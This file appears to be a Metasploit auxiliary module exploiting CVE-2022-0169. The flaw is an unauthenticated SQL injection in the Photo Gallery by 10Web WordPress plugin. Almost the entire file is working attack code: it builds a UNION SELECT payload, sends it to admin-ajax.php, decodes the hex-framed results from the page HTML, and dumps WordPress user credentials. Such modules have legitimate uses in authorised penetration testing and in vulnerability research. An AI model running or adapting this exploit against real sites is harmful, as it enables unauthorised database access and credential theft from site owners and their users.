##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Photo Gallery Plugin SQL Injection (CVE-2022-0169)',
        'Description' => %q{
          The Photo Gallery by 10Web WordPress plugin before 1.6.0 is vulnerable to
          unauthenticated SQL injection via the 'bwg_tag_id_bwg_thumbnails_0[]'
          parameter in admin-ajax.php (action=bwg_frontend_data).
        },
        'Author' => [
          'Krzysztof Zając',    # Discovery
          'Valentin Lobstein',  # Metasploit module
          'X3RX3S'              # Help
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2022-0169'],
          ['WPVDB', '0b4d870f-eab8-4544-91f8-9c5f0538709c'],
          ['URL', 'https://github.com/X3RX3SSec/CVE-2022-0169']
        ],
        'DefaultOptions' => {
          'VERBOSE' => true
        },
        'DisclosureDate' => '2022-03-14',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path to WordPress', '/']),
      OptInt.new('COUNT', [true, 'Number of user rows to retrieve (0 for all)', 5]),
      OptInt.new('SHORTCODE_ID', [true, 'Existing Photo Gallery shortcode ID', 1]),
      Opt::RPORT(80)
    ])
  end

  class RequestError < StandardError
    attr_reader :failure

    def initialize(failure, message)
      @failure = failure
      super(message)
    end
  end

  def get_sqli_object
    create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true, encoder: :hex, safe: true, strict_results: true }) do |payload|
      expression = payload.to_s.strip.gsub(/\s+/, ' ')
      start_marker, end_marker = Array.new(2) { Rex::Text.rand_text_alpha(16) }
      # Hex literals keep reflected query text from masquerading as a result.
      # The NULL tag is distinct from an empty value; HEX preserves whitespace
      # and bytes through both escaped HTML title and image-alt channels.
      framed = "concat(0x#{start_marker.unpack1('H*')},ifnull(concat(0x56,hex(cast((#{expression}) as binary))),0x4e),0x#{end_marker.unpack1('H*')})"
      columns = Array.new(23) { |index| index == 7 ? "(#{framed})" : rand(1000..9999) }
      injected = ")\" AND 0 UNION SELECT #{columns.join(',')} -- -"

      res = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
        'vars_get' => {
          'action' => 'bwg_frontend_data',
          'shortcode_id' => datastore['SHORTCODE_ID'].to_s,
          'bwg_tag_id_bwg_thumbnails_0[]' => injected
        }
      )
      raise RequestError.new(Failure::Unreachable, 'Photo Gallery SQL request did not receive a response') unless res
      if [401, 403].include?(res.code)
        raise RequestError.new(Failure::NoAccess, "Photo Gallery SQL request was denied (HTTP #{res.code})")
      end
      raise RequestError.new(Failure::UnexpectedReply, "Photo Gallery SQL request returned HTTP #{res.code}") unless res.code == 200

      extract_scalar(res, start_marker, end_marker)
    end
  end

  def check
    prepare_sqli
    return Exploit::CheckCode::Vulnerable('SQL injection confirmed') if @sqli.test_vulnerable

    Exploit::CheckCode::Unknown('Photo Gallery SQL injection test did not return the expected scalar')
  rescue RequestError => e
    Exploit::CheckCode::Unknown(e.message)
  rescue MySQLi::Common::ResultError => e
    elog('Photo Gallery SQL result validation failed', error: e)
    Exploit::CheckCode::Unknown("Photo Gallery SQL response was invalid: #{e.message}")
  rescue Rex::ConnectionError, Rex::TimeoutError, OpenSSL::SSL::SSLError => e
    elog('Photo Gallery SQL injection check failed to connect', error: e)
    Exploit::CheckCode::Unknown('Photo Gallery SQL request failed to connect or complete')
  end

  def run
    count = datastore['COUNT']
    unless count.is_a?(Integer) && count >= 0
      raise RequestError.new(Failure::BadConfig, 'COUNT must be zero or greater')
    end

    prepare_sqli
    unless @sqli.test_vulnerable
      raise RequestError.new(Failure::UnexpectedReply, 'Photo Gallery SQL injection test did not return the expected scalar')
    end

    wordpress_sqli_initialize(@sqli)
    unless @prefix.is_a?(String) && @prefix.match?(/\A[a-zA-Z0-9_]+\z/)
      raise RequestError.new(Failure::UnexpectedReply, 'Unable to identify the WordPress database table prefix')
    end

    wordpress_sqli_get_users_credentials(count)
  rescue RequestError => e
    case e.failure
    when Failure::Unreachable
      fail_with(Failure::Unreachable, e.message)
    when Failure::NoAccess
      fail_with(Failure::NoAccess, e.message)
    when Failure::BadConfig
      fail_with(Failure::BadConfig, e.message)
    else
      fail_with(Failure::UnexpectedReply, e.message)
    end
  rescue MySQLi::Common::ResultError => e
    elog('Photo Gallery user extraction validation failed', error: e)
    fail_with(Failure::UnexpectedReply, "Photo Gallery user extraction failed: #{e.message}")
  rescue Rex::ConnectionError, Rex::TimeoutError, OpenSSL::SSL::SSLError => e
    elog('Photo Gallery credential collection failed to connect', error: e)
    fail_with(Failure::Unreachable, 'Photo Gallery SQL request failed to connect or complete')
  end

  private

  def prepare_sqli
    @sqli = @prefix = nil
    shortcode = datastore['SHORTCODE_ID']
    unless shortcode.is_a?(Integer) && shortcode > 0
      raise RequestError.new(Failure::BadConfig, 'SHORTCODE_ID must identify an existing positive shortcode ID')
    end

    @sqli = get_sqli_object
  end

  def extract_scalar(response, start_marker, end_marker)
    nodes = response.get_html_document.css('div.bwg-title2, .bwg-container img[alt]')
    values = nodes.map { |node| (node.name == 'img' ? node['alt'] : node.text).to_s.strip }
    candidates = values.select { |value| value.start_with?(start_marker) || value.end_with?(end_marker) }
    if candidates.empty?
      raise RequestError.new(Failure::UnexpectedReply, 'Photo Gallery response did not include the SQL result frame; verify SHORTCODE_ID and gallery settings')
    end

    pattern = /\A#{Regexp.escape(start_marker)}(N|V(?:[0-9a-fA-F]{2})*)#{Regexp.escape(end_marker)}\z/
    results = candidates.map do |candidate|
      match = pattern.match(candidate)
      raise RequestError.new(Failure::UnexpectedReply, 'Photo Gallery returned a malformed SQL result frame') unless match

      match[1] == 'N' ? nil : Rex::Text.hex_to_raw(match[1].delete_prefix('V'))
    end.uniq
    unless results.length == 1
      raise RequestError.new(Failure::UnexpectedReply, 'Photo Gallery returned conflicting SQL result frames')
    end

    results.first
  end
end
